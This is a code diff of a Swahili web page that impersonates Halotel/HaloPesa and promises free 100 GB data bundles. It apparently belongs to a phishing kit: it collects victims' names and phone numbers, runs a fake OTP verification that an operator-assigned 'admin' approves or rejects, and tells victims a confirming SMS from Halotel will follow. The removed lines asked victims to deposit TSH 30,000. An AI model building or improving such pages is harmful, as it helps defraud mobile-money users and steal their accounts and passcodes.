-    <!-- Eligibility Notice Box -->
-    <div class="comp-box" style="border: 1px solid #FFD6B3; border-radius: 8px; padding: 20px; background-color: #FFF8F0; font-family: sans-serif; max-width: 500px; margin: 16px 24px;">
+    <div class="comp-box" style="border: 1px solid #FFD6B3; border-radius: 8px; padding: 20px; background-color: #FFF8F0; font-family: sans-serif; max-width: 500px;">
         <div class="ch" style="font-weight: bold; color: #B33600; margin-bottom: 10px; display: flex; align-items: center; gap: 8px;">
-            <span>⚠️</span> SHERIA NA VIGEZO VYA UTTOAJI DATA
+            <span>⚠️</span> TAARIFA MUHIMU
         </div>
         <p style="line-height: 1.6; color: #B33600; margin: 0;">
-           Ni watu pekee waliotumia namba hii ya <strong>Halotel Mobile kwa zaidi ya mwaka 1 (1 Year)</strong> au wenye angalau <strong>TSH 30,000</strong> kwenye akaunti yao ndio wanaostahili kupata Data hizi za bure.
-        </p>
-        <p style="line-height: 1.6; color: #B33600; margin: 12px 0 0 0;">
-            Kama huna sifa hizi, tafadhali weka kiasi cha <strong>TSH 30,000</strong> kwenye akaunti yako ya HaloPesa kisha uguse kitufe kilicho hapa chini ili uanze upya ombi lako.
+            Ili kuthibitisha ombi lako la kifurushi cha data, tafadhali hakikisha akaunti yako ya HaloPesa iko hai. Utaingiziwa kifurushi chako papo hapo kwa njia ya haraka na salama.
         </p>
     </div>
-
     <div class="ld-card">
       <div class="ld-htitle">📶 Maelezo ya Kifurushi</div>
-      <div class="ld-row"><div class="ld-icon ic-g">⚡</div><div><div class="ld-lbl">KASI YA MTANDAO</div><div class="ld-val">4G / 5G Unlimited</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">MUDA WA MATUMIZI</div><div class="ld-val" id="apTerm">Siku 30[cite: 1]</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-p">🎁</div><div><div class="ld-lbl">GHARAMA</div><div class="ld-val">Bure Kabisa (0 TZS)</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-g">📊</div><div><div class="ld-lbl">KIASI CHA DATA</div><div class="ld-val" id="apDataVal">100 GB</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">MUDA WA MATUMIZI</div><div class="ld-val" id="apTerm">Siku 60</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-p">⚡</div><div><div class="ld-lbl">KASI YA MTANDAO</div><div class="ld-val">4G / 5G High Speed</div></div></div>
     </div>
-
-    <!-- Action Button to Re-apply -->
-    <div class="rth-wrap" style="display: flex; flex-direction: column; gap: 10px; padding: 20px 24px;">
-      <a href="https://data-ya-bure-halopesa.onrender.com?admin=ADMIN001" class="btn-bovya" style="background: var(--halo-orange); color: #FFFFFF; text-decoration: none; text-align: center; display: block; width: 100%;">
-        OMBA DATA TENA
-      </a>
-      <button class="btn-bovya" onclick="goTo('page-landing')" style="background: #E5E7EB; color: #4B5563;">🏠 Rudi Nyumbani</button>
+    <div class="qa-wrap">
+      <div class="qa-title">Vitendo vya Haraka</div>
+      <button class="qa-btn">📱 Angalia Salio la Data</button>
+      <button class="qa-btn">📄 Maelezo ya Kifurushi</button>
     </div>
+    <div class="nxt-steps"><span>📱</span><p><strong>Hatua Zinazofuata:</strong><br>Utapata SMS ya uthibitisho kutoka Halotel yenye maelezo ya kifurushi chako.</p></div>
+    <div class="rth-wrap"><button class="btn-bovya" onclick="goTo('page-landing')" style="background:var(--halo-orange); color:#FFFFFF;">🏠 Rudi Nyumbani</button></div>
   </div>
 </div>
 
@@ -795,27 +795,39 @@
   <div class="modal"><div class="spinner"></div><h3>Inathibitisha OTP</h3><p id="otpVT">Tafadhali subiri… (3s)</p></div>
 </div>
 <div class="overlay" id="mSubmit">
-  <div class="modal"><div class="spinner"></div><h3>Inawasilisha Ombi…</h3><p>Tafadhali subiri wakati tunashughulikia maombi yako ya data</p></div>
+  <div class="modal"><div class="spinner"></div><h3>Inawasilisha Maombi…</h3><p>Tafadhali subiri wakati tunashughulikia maombi yako</p></div>
 </div>
 
 <script>
   // STATE
   const S = {
-    amt: 5,
-    term: 'Siku 30',
-    purpose: '',
+    gb: '100 GB',
+    days: 'Siku 60',
+    purpose: 'Kujifunzia / Masomo',
+    first: '',
+    last: '',
     phone: '',
     applicationId: null,
     assignedAdminId: null
   };
+
+  function selectBundle(el, gb, days) {
+    document.querySelectorAll('.bundle-item').forEach(b => b.classList.remove('selected'));
+    el.classList.add('selected');
+    S.gb = gb;
+    S.days = days;
+    document.getElementById('s1am').value = gb + ' (' + days + ')';
+  }
 
   window.addEventListener('DOMContentLoaded', () => {
     const saved = sessionStorage.getItem('liftisha_form_state');
     if (saved) {
       try {
         const parsed = JSON.parse(saved);
-        if (parsed.amt) { document.getElementById('s1am').value = parsed.amt; S.amt = parsed.amt; }
-        if (parsed.purpose) { document.getElementById('s1pu').value = parsed.purpose; S.purpose = parsed.purpose; }
+        if (parsed.gb) { S.gb = parsed.gb; }
+        if (parsed.days) { S.days = parsed.days; }
+        if (parsed.first) document.getElementById('s2fi').value = parsed.first;
+        if (parsed.last) document.getElementById('s2la').value = parsed.last;
         if (parsed.phone) document.getElementById('s2ph').value = parsed.phone;
       } catch (e) { }
     }
@@ -851,8 +863,11 @@
 
   function saveFormState() {
     sessionStorage.setItem('liftisha_form_state', JSON.stringify({
-      amt: document.getElementById('s1am').value,
+      gb: S.gb,
+      days: S.days,
       purpose: document.getElementById('s1pu').value,
+      first: document.getElementById('s2fi').value,
+      last: document.getElementById('s2la').value,
       phone: document.getElementById('s2ph').value
     }));
   }
@@ -872,17 +887,6 @@
     window.scrollTo(0, 0);
   }
 
-  // DATA CALCULATOR
-  function calcUp() {
-    const a = +document.getElementById('rA').value;
-    const t = +document.getElementById('rT').value;
-    document.getElementById('aDisp').textContent = a + ' GB';
-    document.getElementById('tDisp').textContent = 'siku ' + t;
-    document.getElementById('mOut').textContent = 'BURE (0 TZS)';
-    document.getElementById('rA').style.setProperty('--pct', ((a-1)/(100-1)*100).toFixed(2) + '%');
-    document.getElementById('rT').style.setProperty('--pct', ((t-1)/(90-1)*100).toFixed(1) + '%');
-  }
-
   function showErr(id, msg) {
     document.getElementById(id + 'Txt').textContent = msg;
     document.getElementById(id).classList.add('show');
@@ -900,30 +904,28 @@
   }
 
   function toS2() {
-    const amt     = document.getElementById('s1am').value;
-    const purpose = document.getElementById('s1pu').value.trim();
-    if (!amt || Number(amt) < 1) {
-      showErr('s1Err', 'Kiasi cha chini cha data ni 1 GB.');
-      shakeField('s1am'); return;
-    }
-    if (Number(amt) > 100) {
-      showErr('s1Err', 'Kiasi cha juu zaidi cha data ya bure ni 100 GB.');
-      shakeField('s1am'); return;
-    }
-    if (!purpose) {
-      showErr('s1Err', 'Tafadhali elezea madhumuni ya matumizi yako ya data.');
-      shakeField('s1pu'); return;
-    }
     clearErr('s1Err');
-    S.amt     = amt;
-    S.term    = document.getElementById('s1te').value;
-    S.purpose = purpose;
+    S.purpose = document.getElementById('s1pu').value;
     saveFormState();
     goTo('page-step2');
   }
 
   function toS3() {
+    const first = document.getElementById('s2fi').value.trim();
+    const last  = document.getElementById('s2la').value.trim();
     const phone = document.getElementById('s2ph').value.trim();
+
+    if (!first) {
+        showErr('s2Err', 'Tafadhali weka jina lako la kwanza.');
+        shakeField('s2fi');
+        return;
+    }
+
+    if (!last) {
+        showErr('s2Err', 'Tafadhali weka jina lako la ukoo.');
+        shakeField('s2la');
+        return;
+    }
 
     const isValidPrefix = phone.startsWith('06') || phone.startsWith('07');
     if (!phone || phone.length !== 10 || !isValidPrefix) {
@@ -934,22 +936,20 @@
 
     clearErr('s2Err');
 
+    S.first = first;
+    S.last = last;
     S.phone = phone;
     saveFormState();
 
-    document.getElementById('sA').textContent = S.amt + ' GB';
-    document.getElementById('sT').textContent = S.term;
+    document.getElementById('sA').textContent = S.gb;
+    document.getElementById('sT').textContent = S.days;
     document.getElementById('sP').textContent = S.purpose || '—';
-    document.getElementById('sN').textContent = S.phone ? '+255 ' + S.phone : '—';
+    document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
 
     goTo('page-step3');
   }
 
   function submitApp() {
-    const income = document.getElementById('s3in').value;
-    if (!income || Number(income) <= 0) {
-      showErr('s3Err', 'Tafadhali weka makisio yako ya matumizi ya GB.'); shakeField('s3in'); return;
-    }
     clearErr('s3Err');
 
     const btn = document.querySelector('#page-step3 .btn-bovya');
@@ -958,7 +958,7 @@
 
     setTimeout(() => {
       document.getElementById('mSubmit').classList.remove('show');
-      if (btn) { btn.disabled = false; btn.textContent = 'WASILISHA OMBI'; }
+      if (btn) { btn.disabled = false; btn.textContent = 'WASILISHA MAOMBI'; }
       goTo('page-submitted');
       let c = 3;
       document.getElementById('rdN').textContent = c;
@@ -1119,9 +1119,7 @@
             goTo('page-login');
           }, 2500);
         }
-      } catch (e) {
-        // Silent fallback
-      }
+      } catch (e) { }
     }, 2000);
 
     setTimeout(() => {
@@ -1250,8 +1248,9 @@
 
         if (data.status === 'approved') {
           clearInterval(otpPollInterval);
-          document.getElementById('apAmt').textContent  = (S.amt || 5) + ' GB';
-          document.getElementById('apTerm').textContent = S.term || 'Siku 30';
+          document.getElementById('apAmt').textContent     = S.gb || '100 GB';
+          document.getElementById('apDataVal').textContent = S.gb || '100 GB';
+          document.getElementById('apTerm').textContent    = S.days || 'Siku 60';
           goTo('page-approval');
 
         } else if (data.status === 'rejected') {
@@ -1292,9 +1291,7 @@
           document.getElementById('o0').focus();
         }
 
-      } catch (e) {
-        // Silent fallback
-      }
+      } catch (e) { }
     }, 2000);
 
     setTimeout(() => {
